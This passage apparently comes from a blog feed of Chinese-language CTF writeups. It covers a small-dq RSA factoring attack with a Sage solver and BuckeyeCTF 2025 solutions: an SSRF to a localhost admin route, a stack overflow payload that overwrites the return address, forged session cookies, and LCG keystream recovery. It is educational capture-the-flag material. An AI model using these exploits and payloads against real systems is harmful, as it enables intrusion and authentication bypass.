&#123;b64encode(ciphertext).decode()&#125;&quot;)print(f&quot;tag: &#123;b64encode(tag).decode()&#125;&quot;) 连接服务器可以得到：12345678910111213141516171819└─$ nc 10.80.17.81 5202-----BEGIN PUBLIC KEY-----MIICGjANBgkqhkiG9w0BAQEFAAOCAgcAMIICAgKB/gC0uMUwDNdTsL14cbF5GstgHxeCxOaHQ0+JrTHDBudK44hDL2lUDChgiurLNKz496HSydpRYTIp9dh7lmlXiBUma7dY5Hdiv+345/UyAo3OKHRXvjqN+IWvS9oU0V9VL2TQmDUYMJiqE34Hr0SUYC7G45SxzZUXTPztCgEjd2rpwBlmEXNaNXQGvQaRD5qfys+TPgj5J0kFDHyMjvaM1UtM0yZ0wc2SN6W3AbUYs8oAc1kUkVA2yQeywCVD6wG5HsDbUrVsQM5zRjxj28iMcBKSbmMiAYDkKF3JWgPv5tS6vrtL/2ygwEA9BVd9kyxK7/GQxaT4uNUVyCEFBDwbAoH+AJFZ9VK1IUgJa1fiXsy1/JJQOxcyA+OUe6lrrfoD5lP6Mfz2k92JL0MAB3K4vIs0OZgwBeUxBEHcjTG4gHigNYaAyq1s8ApQlBCWILWnYAm2ZGCYPxyNX7tvEgQKWL4MeEXrbn7ME4AsR9s8ReRp0WFVMD3/HU0GGi/nLfu295gVEMcnZaayvZ1nKERgKGLJVsVLWV9WJVr54g1s6HMlXn0JofVAr+3FHkBIbZCJrlBdmu+9HKYwExfReI7kqao0ng2E+xDW4Z574pPz2SMCaiazqIpXqaE2UCFndfraRXe29HUVFbuSGN10w0ge24frafWuskQVainfWCzAQjs=-----END PUBLIC KEY-----enc_aes_key: RPgWZa2d7sl7ff05Vztd+3LG6MI6mDYCvhQ3nyHerI4xCU1UtVdJAuc3bGd5lH41V/cPnKUSZ3pyQ7ztI5Xkm9JORH9sWZ3XmSGiXYFNBzvDVKB2RCrD9ym+lEqJSytoGf2pLf3LikbCSDWvemw1hbcS1wZO0ZlqDCSAVA4E+VPZMqDG6BtUOjjKoDSXfK6lKvhcf3bMWksLk5OgfqfVU6UPPyGJfOXTkEOzqDJXReodRCvJ2s6rUxVEiJTd6KODp2fMCeFiyobP5aaMc9dWmwgDLhuHcU6AyNP0OS7wk0jRNAuuoxsbCSqS40WsZNGHDkWqOe2PMOexk9ojRA==nonce: fnW3/7f8REONEpaxciphertext: fEXUdIK3Lz72A0mI3Qz7JPKIkCOpBqrAM7SfG44p+FQrZ88rwPv4LgRwDewFGXP2brkH8gDxVpS7LOLJ24IQJoEp5vtwhXbjz7Ma33JD0DZV/25RZCiyKC7nY5dZ55s=tag: 0YLSbUMw0ctRes7Sq6kYTw== 解析一下公钥就可以得到： 1234类型：公钥n=1359820872970547556173935150474481815717328572399120915602160820069266412576871190208575380021877214003011864598895230655026748175693699868103965991642901738030944778587722779234039114753415014125225674035531145397971360441980034482806466559036689616010630666310492124720494186064419311344084685847839050026833576832529293002210434374767000656025241828574830622784228186168314471906430324965643570616245660239706647219394125532272103687891636739777798439790464477110591936977079814886313654276642341326894390130057950971801433091624348556317803193338841141436337689802023520509335825650275040966262305472134171e=1093680519331187988756386827314976296267175567662985679284015730888530125712389106904838723896450456481050473532473854286109038539753130314953742249779280534081037838095857594404078189107166916304540993668853664825665486364097797465143273470686376019620959105546726885330925197635832891271094953999640621535438785959658211783138264307339203053235456338179189749603389765405060301866066907397449063487123649421496167346403419323667015826390809458009586469769327999834769109220938532637883503174075741461190855038998041274174429832022456718197273027690130690895156302958624352677158442035485522481200692711146043 分析/思路这道题的核心漏洞是生成出来的dq太小了： 12345678910# nbits = 2025# nbits.bit_length() // 2 = 11/2 = 5# 2 &lt;&lt; 5 = 64mask = (2 &lt;&lt; nbits.bit_length() // 2) - 1 # mask = 64 - 1 = 63# nbits - 1 = 2024# 2024 &amp; 63 = 40dq_bits = (nbits - 1) &amp; mask # = 40dq = getrandbits(dq_bits) # dq只有40bit 回顾一下在RSA里我们有： e \\cdot d \\equiv 1 \\pmod{\\phi(N)}这意味着在模 $q-1$ 下也成立（因为 $\\phi(N) = (p-1)(q-1)$）： e \\cdot d \\equiv 1 \\pmod{q-1}定义 $d_q = d \\pmod{q-1}$，则有： e \\cdot d_q \\equiv 1 \\pmod{q-1}也就是说存在整数$k$，使得： e \\cdot d_q = k(q-1) + 1根据费马小定理，对于任意 $r$（只要 $r$ 不是 $q$ 的倍数）都有有 $r^{q-1} \\equiv 1 \\pmod q$。 所以： r^{e \\cdot d_q} \\equiv r^{k(q-1) + 1} \\equiv (r^{q-1})^k \\cdot r \\equiv 1^k \\cdot r \\equiv r \\pmod q即 r^{e \\cdot d_q} - r \\equiv 0 \\pmod q这意味着如果我们成功计算出了$d_q$，那么就可以通过计算$\\gcd(r^{e \\cdot d_q} - r, N)$来求出q。 那么现在的问题就变成了我们该如何得到这个$d_q$。 这个情况和这篇论文里第4章的这个lemma的情况完全一样： Fast Variants of RSA (Dan Boneh, Hovav Shacham) 所以我们可以直接通过实现证明里的算法来得到$d_q$。 这里的方法本质上是爆破，只不过会用Baby-step Giant-step (BSGS)的变种结合快速多项式多点求值来加速。（爆破空间会从原本的$2^{40}$变成$2^{20}$。） 将 $d_q$ 写成： d_q = i \\cdot D + j其中 $D = 2^{20}$（步长）。那么 $0 \\le i &lt; 2^{20}$ (Giant steps)，$0 \\le j &lt; 2^{20}$ (Baby steps)。 我们的目标是找到一对 $(i, j)$ 使得： r^{e(i \\cdot D + j)} \\equiv r \\pmod q 具体实现： 构造多项式 $f(x)$ (Baby Steps): 定义函数 $f(x)$： f(x) = \\prod_{j=0}^{D-1} (r^{e \\cdot j} \\cdot x - r)这里的 $j$ 就是遍历了所有可能的 Baby steps。 构造求值点 $u$ (Giant Steps): 构造一系列点 $u_i$： u_i = (r^{e \\cdot D})^i = r^{e \\cdot i \\cdot D}这里的 $i$ 遍历了所有可能的 Giant steps。 碰撞检测 (Evaluation): 如果我们将正确的 $u_i$ 代入多项式 $f(x)$： \\begin{align*} f(u_i) &= \\dots \\times (r^{e \\cdot j} \\cdot u_i - r) \\times \\dots\\\\ f(u_i) &= \\dots \\times (r^{e \\cdot j} \\cdot r^{e \\cdot i \\cdot D} - r) \\times \\dots\\\\ f(u_i) &= \\dots \\times (r^{e(i \\cdot D + j)} - r) \\times \\dots \\end{align*}当 $i \\cdot D + j$ 恰好等于真实的 $d_q$ 时，括号里的那一项 $r^{e \\cdot d_q} - r \\equiv 0 \\pmod q$。 因此，$f(u_i) \\pmod q$ 一定为 0。这意味着 $f(u_i)$ 是 $q$ 的倍数。 计算 $\\gcd(f(u_i), N)$ 即可拿到 $q$。 并且代码里使用了eval函数配合子积树（Subproduct Tree），是基于 FFT 运算加速的快速多点求值算法 (Fast Multipoint Evaluation)。所以这份代码的复杂度为$\\mathcal{O}(\\sqrt{d_q} log(d_q))$。 代码在WSL里大概需要跑十几分钟才会出结果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113from base64 import b64decodefrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSAfrom sage.all import *PUBLIC_KEY_PEM = b&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIICGjANBgkqhkiG9w0BAQEFAAOCAgcAMIICAgKB/gC0uMUwDNdTsL14cbF5GstgHxeCxOaHQ0+JrTHDBudK44hDL2lUDChgiurLNKz496HSydpRYTIp9dh7lmlXiBUma7dY5Hdiv+345/UyAo3OKHRXvjqN+IWvS9oU0V9VL2TQmDUYMJiqE34Hr0SUYC7G45SxzZUXTPztCgEjd2rpwBlmEXNaNXQGvQaRD5qfys+TPgj5J0kFDHyMjvaM1UtM0yZ0wc2SN6W3AbUYs8oAc1kUkVA2yQeywCVD6wG5HsDbUrVsQM5zRjxj28iMcBKSbmMiAYDkKF3JWgPv5tS6vrtL/2ygwEA9BVd9kyxK7/GQxaT4uNUVyCEFBDwbAoH+AJFZ9VK1IUgJa1fiXsy1/JJQOxcyA+OUe6lrrfoD5lP6Mfz2k92JL0MAB3K4vIs0OZgwBeUxBEHcjTG4gHigNYaAyq1s8ApQlBCWILWnYAm2ZGCYPxyNX7tvEgQKWL4MeEXrbn7ME4AsR9s8ReRp0WFVMD3/HU0GGi/nLfu295gVEMcnZaayvZ1nKERgKGLJVsVLWV9WJVr54g1s6HMlXn0JofVAr+3FHkBIbZCJrlBdmu+9HKYwExfReI7kqao0ng2E+xDW4Z574pPz2SMCaiazqIpXqaE2UCFndfraRXe29HUVFbuSGN10w0ge24frafWuskQVainfWCzAQjs=-----END PUBLIC KEY-----&quot;&quot;&quot;enc_aes_key_b64 = &quot;RPgWZa2d7sl7ff05Vztd+3LG6MI6mDYCvhQ3nyHerI4xCU1UtVdJAuc3bGd5lH41V/cPnKUSZ3pyQ7ztI5Xkm9JORH9sWZ3XmSGiXYFNBzvDVKB2RCrD9ym+lEqJSytoGf2pLf3LikbCSDWvemw1hbcS1wZO0ZlqDCSAVA4E+VPZMqDG6BtUOjjKoDSXfK6lKvhcf3bMWksLk5OgfqfVU6UPPyGJfOXTkEOzqDJXReodRCvJ2s6rUxVEiJTd6KODp2fMCeFiyobP5aaMc9dWmwgDLhuHcU6AyNP0OS7wk0jRNAuuoxsbCSqS40WsZNGHDkWqOe2PMOexk9ojRA==&quot;nonce_b64 = &quot;fnW3/7f8REONEpax&quot;ciphertext_b64 = &quot;fEXUdIK3Lz72A0mI3Qz7JPKIkCOpBqrAM7SfG44p+FQrZ88rwPv4LgRwDewFGXP2brkH8gDxVpS7LOLJ24IQJoEp5vtwhXbjz7Ma33JD0DZV/25RZCiyKC7nY5dZ55s=&quot;tag_b64 = &quot;0YLSbUMw0ctRes7Sq6kYTw==&quot;rsa_pub = RSA.import_key(PUBLIC_KEY_PEM)enc_aes_key = b64decode(enc_aes_key_b64)nonce = b64decode(nonce_b64)ciphertext = b64decode(ciphertext_b64)tag = b64decode(tag_b64)N = rsa_pub.ne = rsa_pub.e# 用多点多项式求值爆破 dq，分解 NR = Zmod(N)P = PolynomialRing(R, &#x27;x&#x27;)x = P.gen()D = 2**20r = R.random_element()# 预计算 u_i = r^(e * i * D)uu = r ** (e * D)uv = 1 / uuu = [(uv := uv * uu) for _ in range(D)]# 等价于：u = [r ** (e * i * D) for i in range(D)]# 构造 f(x) = ∏_&#123;j=0&#125;^&#123;D-1&#125; (r^&#123;e*j&#125; * x - r)fu = r**efv = 1 / fuf = prod((fv := fv * fu) * x - r for _ in range(D))# 等价：f = prod((r ** (e * j)) * x - r for j in range(D))# 构造多点求值用的乘积树 MM = [[x - ui for ui in u]]while len(M[-1]) &gt; 2: M.append([M[-1][i] * M[-1][i + 1] for i in range(0, len(M[-1]), 2)])M.reverse()def eval_poly_at_points(poly, points, o=0, k=0): &quot;&quot;&quot; 多点求值：对多项式 poly 在 points 上求值，返回一个列表。 使用乘积树 M 做分治。 &quot;&quot;&quot; if len(points) == 1: return [int(poly(points[0]))] half = len(points) // 2 pl = points[:half] pr = points[half:] fl = poly % M[k][o] fr = poly % M[k][o + 1] al = eval_poly_at_points(fl, pl, 2 * o, k + 1) ar = eval_poly_at_points(fr, pr, 2 * o + 2, k + 1) return al + ara_values = eval_poly_at_points(f, u)for ai in a_values: g = gcd(ai, N) if g != 1 and g != N: p = g breakelse: raise Exception(&quot;Could not factor N&quot;)q = N // passert p * q == N, &quot;Failed to factor N&quot;# 还原私钥并解密phi = (p - 1) * (q - 1)d = inverse_mod(e, phi)rsa_key = RSA.construct((int(N), int(e), int(d), int(p), int(q)))cipher_rsa = PKCS1_OAEP.new(rsa_key)aes_key = cipher_rsa.decrypt(enc_aes_key)cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)flag = cipher_aes.decrypt_and_verify(ciphertext, tag).decode()print(flag)# └─$ sage solve.py # PP&#123;wow-that-key-generation-was-complicated-lets-hope-noone-does-that-in-practice::nJF73tSn-YBA&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"比赛Writeup","slug":"CTF/比赛Writeup","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%AF%94%E8%B5%9BWriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/en/tags/writeup/"}]},{"title":"BuckeyeCTF 2025 Writeup","slug":"CTF/比赛Writeup/BuckeyeCTF-2025-Writeup","date":"2025-11-08T20:36:40.000Z","updated":"2025-11-29T21:38:36.745Z","comments":true,"path":"2025/11/08/CTF/比赛Writeup/BuckeyeCTF-2025-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/11/08/CTF/%E6%AF%94%E8%B5%9BWriteup/BuckeyeCTF-2025-Writeup/","excerpt":"BuckeyeCTF 2025 比赛的题解，涉及方向：Web, Crypto, Pwn, Misc, Forensics","text":"Beginner这场比赛比较照顾新手所以专门设置了Beginner的部分。 1985 1234567Hey man, I wrote you that flag printer you asked for:begin 755 FLGPRNTR.COMMOAP!@#PD=`:`-&quot;I&amp;Z_6Z&#x27;`&amp;T&quot;&lt;TAP[1,,,#-(4A)7DQ1;AM.=5,:7W5_61EU;:T1U&amp;4=?1AY&gt;&amp;EAU95AU3AE)&amp;D=:&amp;T9O6%&lt;D`end 首先通过begin 755 FLGPRNTR.COM ... end判断出这段内容是uuencode过的二进制内容。反引号在uuencode里代表这一行的长度是 0，所以代码里把它单独当成空块处理，拼起来就得到真正的FLGPRNTR.COM的字节序列。 还原出来的是一个.COM 小程序： 1234567891011; SI = 001Ch 指向密文; 循环：遇到 &#x27;$&#x27; 停，其他字节就地异或 2Ahloop: lodsb cmp al, &#x27;$&#x27; je done xor al, 2Ah stosb jmp loopdone: mov dx, 001Ch ; 解码后的明文起始 mov ah, 09h int 21h ; 打印直到 &#x27;$&#x27; 用python模拟一下即可： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import binasciifrom io import StringIOuu_text = &quot;&quot;&quot;begin 755 FLGPRNTR.COMMOAP!@#PD=`:`-&quot;I&amp;Z_6Z&#x27;`&amp;T&quot;&lt;TAP[1,,,#-(4A)7DQ1;AM.=5,:7W5_61EU;:T1U&amp;4=?1AY&gt;&amp;EAU95AU3AE)&amp;D=:&amp;T9O6%&lt;D`end&quot;&quot;&quot;# --- uu 解码成 .COM 的原始字节 ---data_lines = []capture = Falsefor line in StringIO(uu_text): line = line.rstrip(&quot;\\n&quot;) if line.startswith(&quot;begin &quot;): capture = True continue if line == &quot;end&quot;: break if not capture: continue if not line: continue # 反引号（`）表示空行长度 0，也算一行数据 try: chunk = binascii.a2b_uu(line) except binascii.Error as e: # 有些实现把完全空负载行写成 &quot;`&quot;，也能正常解码为 b&quot;&quot; if line.strip() == &quot;`&quot;: chunk = b&quot;&quot; else: raise data_lines.append(chunk)com_bytes = b&quot;&quot;.join(data_lines)# --- 模拟程序逻辑：从 0x1C 起，遇到 &#x27;$&#x27; 停止，其余字节 XOR 0x2A ---start = 0x1Cout = []i = startwhile i &lt; len(com_bytes): b = com_bytes[i] if b == 0x24: # &#x27;$&#x27; break out.append(b ^ 0x2A) i += 1flag = bytes(out).decode(&quot;ascii&quot;, errors=&quot;replace&quot;)print(flag)# bctf&#123;D1d_y0u_Us3_An_3mul4t0r_Or_d3c0mp1lEr&#125; Augury 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import hashlibstored_data = &#123;&#125;def generate_keystream(i): return (i * 3404970675 + 3553295105) % (2 ** 32)def upload_file(): print(&quot;Choose a name for your file&quot;) name = input() if name in stored_data: print(&quot;There is already a file with that name&quot;) return print(&quot;Remember that your privacy is our top priority and all stored files are encrypted.&quot;) print(&quot;Choose a password&quot;) password = input() m = hashlib.shake_128() m.update(password.encode()) keystream = int.from_bytes(m.digest(4), byteorder=&quot;big&quot;) print(&quot;Now upload the contents of your file in hexadecimal&quot;) contents = input() b = bytearray(bytes.fromhex(contents)) for i in range(0, len(b), 4): key = keystream.to_bytes(4, byteorder=&quot;big&quot;) b[i + 0] ^= key[0] if i + 1 &gt;= len(b): continue b[i + 1] ^= key[1] if i + 2 &gt;= len(b): continue b[i + 2] ^= key[2] if i + 3 &gt;= len(b): continue b[i + 3] ^= key[3] keystream = generate_keystream(keystream) stored_data[name] = b print(&quot;Your file has been uploaded and encrypted&quot;)def view_files(): print(&quot;Available files:&quot;) for i in stored_data.keys(): print(i) print(&quot;Choose a file to get&quot;) name = input() if name not in stored_data: print(&quot;That file is not available&quot;) return print(stored_data[name].hex())def main(): print(&quot;Welcome to Augury&quot;) print(&quot;The best place for secure storage!&quot;) while True: print(&quot;Please select an option:&quot;) print(&quot;1. Upload File&quot;) print(&quot;2. View Files&quot;) print(&quot;3. Exit&quot;) choice = input() match choice: case &quot;1&quot;: upload_file() case &quot;2&quot;: view_files() case &quot;3&quot;: exit()main() 仔细阅读代码可以发现它是这样加密文件的： 将输入的密码作为seed生成一个随机数，然后只取其前4个字节； 将这4个字节与文件的前4个字节进行异或； 利用LCG（线性同余方法）更新这4个字节（生成新的4字节）； 然后与文件的后续的4个字节进行异或； 以此类推… 也就是说只要我们知晓seed，那么我们就可以正常还原文件内容。 但实际上这里有个漏洞，即我们只要能知道第一次生成的随机数的前4个字节（不一定需要知道具体的seed），我们便能还原后续的密码流并且还原加密文件。 连接服务器可以看到里面已经有一份已经被加密过的.png文件： 众所周知，完整的.png文件的开头一定是： 1234567891011121314151617181920212223242526272829303132333435from pathlib import PathA = 3404970675C = 3553295105MOD = 2 ** 32PNG8 = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])def lcg(x: int) -&gt; int: return (x * A + C) % MODin_path = Path(&quot;secret.txt&quot;) # 从服务器上保存下来的加密后的png文件的hexout_path = Path(&quot;decrypted.png&quot;) # 还原出来的png图片data_hex = &quot;&quot;.join(in_path.read_text().split())ct = bytearray(bytes.fromhex(data_hex))ks0_bytes = bytes([ct[0] ^ PNG8[0], ct[1] ^ PNG8[1], ct[2] ^ PNG8[2], ct[3] ^ PNG8[3]])ks = int.from_bytes(ks0_bytes, &quot;big&quot;)n = len(ct)for i in range(0, n, 4): key = ks.to_bytes(4, &quot;big&quot;) ct[i] ^= key[0] if i + 1 &lt; n: ct[i + 1] ^= key[1] if i + 2 &lt; n: ct[i + 2] ^= key[2] if i + 3 &lt; n: ct[i + 3] ^= key[3] ks = lcg(ks)pt = bytes(ct)out_path.write_bytes(pt) 最后便能得到： （我也不知道图片里的是谁。） Cosmonaut 123Cosmonauts run their programs everywhere and all at once.Like on Windows!c05m0p0l174n_c0nn353ur_ Linux上： 123Cosmonauts run their programs everywhere and all at once.Like on Linux!bctf&#123;4_7ru3_ FreeBSD上： 123Cosmonauts run their programs everywhere and all at once.Like on FreeBSD!kn0w5_n0_b0und5&#125; 成功拿到完整flag： 1bctf&#123;4_7ru3_c05m0p0l174n_c0nn353ur_kn0w5_n0_b0und5&#125; ebg13 通过观察这道题的名字以及这段加密内容不难知道这道题跟rot13有关。 看一眼网页： 网页的主要逻辑在给的server.js文件里： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146import Fastify from &#x27;fastify&#x27;;import * as cheerio from &#x27;cheerio&#x27;;const FLAG = process.env.FLAG ?? &quot;bctf&#123;fake_flag&#125;&quot;;const INDEX_HTML = `&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot; /&gt; &lt;title&gt;ebj13&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/98.css&quot; /&gt; &lt;style&gt; body &#123; background: #008080; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; &#125; .window &#123; zoom: 1.5; width: 460px; &#125; .window-body &#123; text-align: center; &#125; form &#123; display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; margin-top: 10px; &#125; input[type=&quot;text&quot;] &#123; width: 300px; &#125; .example-buttons &#123; display: flex; justify-content: center; gap: 8px; margin-top: 12px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;window&quot; role=&quot;application&quot;&gt; &lt;div class=&quot;title-bar&quot;&gt; &lt;div class=&quot;title-bar-text&quot;&gt;ebj13&lt;/div&gt; &lt;div class=&quot;title-bar-controls&quot;&gt; &lt;button aria-label=&quot;Minimize&quot;&gt;&lt;/button&gt; &lt;button aria-label=&quot;Maximize&quot;&gt;&lt;/button&gt; &lt;button aria-label=&quot;Close&quot;&gt;&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;window-body&quot;&gt; &lt;p&gt;&lt;strong&gt;Enter URL&lt;/strong&gt;&lt;/p&gt; &lt;form action=&quot;/ebj13&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;url&quot; placeholder=&quot;Enter a URL&quot; id=&quot;urlInput&quot; /&gt; &lt;button type=&quot;submit&quot; class=&quot;button&quot;&gt;ebj13 it!&lt;/button&gt; &lt;/form&gt; &lt;div class=&quot;example-buttons&quot;&gt; &lt;button class=&quot;button&quot; type=&quot;button&quot; onclick=&quot;urlInput.value = &#x27;https://example.com&#x27;&quot;&gt;example.com&lt;/button&gt; &lt;button class=&quot;button&quot; type=&quot;button&quot; onclick=&quot;urlInput.value = &#x27;https://news.ycombinator.com&#x27;&quot;&gt;news.ycombinator.com&lt;/button&gt; &lt;/div&gt; &lt;p style=&quot;margin-top:10px;font-size:12px;&quot;&gt;Paste a full URL (including https://)&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; `;const fastify = Fastify(&#123; logger: true &#125;);function rot13(str) &#123; return str.replace(/[a-zA-Z]/g, (c) =&gt; String.fromCharCode( c.charCodeAt(0) + (c.toLowerCase() &lt; &#x27;n&#x27; ? 13 : -13) ) );&#125;function rot13TextNodes($, node) &#123; $(node) .contents() .each((_, el) =&gt; &#123; if (el.type === &#x27;text&#x27;) &#123; el.data = rot13(el.data); &#125; else &#123; rot13TextNodes($, el); &#125; &#125;);&#125;fastify.get(&#x27;/&#x27;, async (req, reply) =&gt; &#123; return reply.type(&#x27;text/html&#x27;).send(INDEX_HTML);&#125;);fastify.get(&#x27;/ebj13&#x27;, async (req, reply) =&gt; &#123; const &#123; url &#125; = req.query; if (!url) &#123; return reply.status(400).send(&#x27;Missing ?url parameter&#x27;); &#125; try &#123; const res = await fetch(url); const html = await res.text(); const $ = cheerio.load(html); rot13TextNodes($, $.root()); const modifiedHtml = $.html(); reply.type(&#x27;text/html&#x27;).send(modifiedHtml); &#125; catch (err) &#123; reply.status(500).send(`Error fetching URL`); &#125;&#125;);fastify.get(&#x27;/admin&#x27;, async (req, reply) =&gt; &#123; if (req.ip === &quot;127.0.0.1&quot; || req.ip === &quot;::1&quot; || req.ip === &quot;::ffff:127.0.0.1&quot;) &#123; return reply.type(&#x27;text/html&#x27;).send(`Hello self! The flag is $&#123;FLAG&#125;.`) &#125; return reply.type(&#x27;text/html&#x27;).send(`Hello $&#123;req.ip&#125;, I won&#x27;t give you the flag!`)&#125;)fastify.listen(&#123; port: 3000, host: &#x27;0.0.0.0&#x27; &#125;, (err, address) =&gt; &#123; if (err) throw err; console.log(`Server running at $&#123;address&#125;`);&#125;); 可以看到最后那里，只要输入符合要求的本地回环网址便可以得到flag。 所以说直接输入1http://127.0.0.1:3000/admin 便可以拿到加密后的flag： 1Uryyb frys! Gur synt vf opgs&#123;jung_unccraf_vs_v_hfr_guvf_jrofvgr_ba_vgfrys&#125;. 解密一下便是： 1Hello self! The flag is bctf&#123;what_happens_if_i_use_this_website_on_itself&#125;. 或者输入 1https://ebg13.challs.pwnoh.io/ebj13?url=http://127.0.0.1:3000/admin 可以直接在网站上拿到解密后的内容： 1Hello self! The flag is bctf&#123;what_happens_if_i_use_this_website_on_itself&#125;. hexv 由于没有给任何附件，所以先连上看看： 我们可以看到print_flag的地址以及stack上当前的内容。所以思路大概率就是尝试将返回地址修改成print_flag的地址。 经过多次尝试发现红色的部分是stack canary，而青色的部分是返回地址。所以我们只需要输入（注意保持stack canary的部分不变） 1str 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414100e1e1c6d8edca3d0000000000000000e932e03913560000 再输入quit便可以拿到flag 1bctf&#123;sur3_h0Pe_th1S_r3nderED_PR0pErly&#125; Mind Boggle 1-[-----&gt;+&lt;]&gt;++.++++.---.[-&gt;++++++&lt;]&gt;.[----&gt;+++&lt;]&gt;+.-[---&gt;++++&lt;]&gt;+.&gt;-[-----&gt;+&lt;]&gt;.---.+++++.++++++++++++.-----------.[-&gt;++++++&lt;]&gt;+.--------------.---.-.---.++++++.---.+++.+++++++++++.-------------.++.+..-.----.++...-[---&gt;++++&lt;]&gt;+.-[------&gt;+&lt;]&gt;..--.-[---&gt;++++&lt;]&gt;+.&gt;-[-----&gt;+&lt;]&gt;.---.++++++.+..++++++++++.------------.+++.-----.-.+++++..----.---.++++++.-..++.--.+.-.--.+++.---..--.++.++++++.----..+.---.+++.+++++++++++.-------------.++.+..-.----.++...-[---&gt;++++&lt;]&gt;+.-[------&gt;+&lt;]&gt;...--..+++.-.++.----.++.-.+++.-----.---.+++++.+.+.--..++++.------..+.+++++++++++++.&gt;-[-----&gt;+&lt;]&gt;.++...-.++++.---.----.++++++.+.----.-[---&gt;++++&lt;]&gt;.[----&gt;+++&lt;]&gt;+.+.--.++.--.++++++. 不难发现这是brainfuck，所以随便找个在线编译的网站即可： 得到 1596D4E305A6E7430636A467762444E664E30677A583277306557565363313955636A467762444E66644768465830567559334A35554851784D453539 再解码一下即可： 1bctf&#123;tr1pl3_7H3_l4yeRs_Tr1pl3_thE_EncryPt10N&#125; Ramesses main文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445from flask import Flask, render_template, request, make_response, redirect, url_forimport base64import jsonimport osflag = os.getenv(&quot;FLAG&quot;, &quot;bctf&#123;fake_flag&#125;&quot;)app = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def home(): if request.method == &quot;POST&quot;: name = request.form.get(&quot;name&quot;, &quot;&quot;) cookie_data = &#123;&quot;name&quot;: name, &quot;is_pharaoh&quot;: False&#125; encoded = base64.b64encode(json.dumps(cookie_data).encode()).decode() response = make_response(redirect(url_for(&quot;tomb&quot;))) response.set_cookie(&quot;session&quot;, encoded) return response return render_template(&quot;index.html&quot;)@app.route(&quot;/tomb&quot;)def tomb(): session_cookie = request.cookies.get(&quot;session&quot;) if not session_cookie: return redirect(url_for(&quot;home&quot;)) try: user = json.loads(base64.b64decode(session_cookie).decode()) except Exception: return redirect(url_for(&quot;home&quot;)) return render_template(&quot;tomb.html&quot;, user=user, flag=flag)@app.route(&quot;/logout&quot;)def logout(): response = make_response(redirect(url_for(&quot;home&quot;))) response.set_cookie(&quot;session&quot;, &quot;&quot;, expires=0) return responseif __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=8000) 随便注册个账号先登录进去： 可以看到有个session cookie。 解码一下： 将is_pharaoh的false改成true，任何将原本的cookie修改成新的这个： 再刷新网页便可以直接看到flag： 1bctf&#123;s0_17_w45_wr177en_50_1t_w45_d0n3&#125; The Professor’s Files 这道题会拿到一份docx文件： 没有什么特殊的内容。 想到docx文件本身就算zip的格式，所以我们将文件结尾修改成zip文件并解压它，之后便能在里面的theme1.xml里找到flag： 12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;a:theme xmlns:a=&quot;http://schemas.openxmlformats.org/drawingml/2006/main&quot; name=&quot;ProfessorTheme_Loud&quot;&gt; &lt;a:themeElements&gt; &lt;a:clrScheme name=&quot;CustomLoud&quot;&gt; &lt;a:dk1&gt;&lt;a:srgbClr val=&quot;1F1F1F&quot;/&gt;&lt;/a:dk1&gt; &lt;a:lt1&gt;&lt;a:srgbClr val=&quot;FFFFFF&quot;/&gt;&lt;/a:lt1&gt; &lt;a:dk2&gt;&lt;a:srgbClr val=&quot;2B2B2B&quot;/&gt;&lt;/a:dk2&gt; &lt;a:lt2&gt;&lt;a:srgbClr val=&quot;F4F4F4&quot;/&gt;&lt;/a:lt2&gt; &lt;a:accent1&gt;&lt;a:srgbClr val=&quot;FF4500&quot;/&gt;&lt;/a:accent1&gt; &lt;!-- vivid orange --&gt; &lt;a:accent2&gt;&lt;a:srgbClr val=&quot;0066CC&quot;/&gt;&lt;/a:accent2&gt; &lt;!-- strong blue --&gt; &lt;a:accent3&gt;&lt;a:srgbClr val=&quot;8A2BE2&quot;/&gt;&lt;/a:accent3&gt; &lt;!-- bright purple --&gt; &lt;a:accent4&gt;&lt;a:srgbClr val=&quot;228B22&quot;/&gt;&lt;/a:accent4&gt; &lt;!-- strong green --&gt; &lt;a:accent5&gt;&lt;a:srgbClr val=&quot;FFD700&quot;/&gt;&lt;/a:accent5&gt; &lt;!-- gold --&gt; &lt;a:accent6&gt;&lt;a:srgbClr val=&quot;DC143C&quot;/&gt;&lt;/a:accent6&gt; &lt;!-- crimson --&gt; &lt;!-- bctf&#123;docx_is_zip&#125; --&gt; &lt;a:hlink&gt;&lt;a:srgbClr val=&quot;0000FF&quot;/&gt;&lt;/a:hlink&gt; 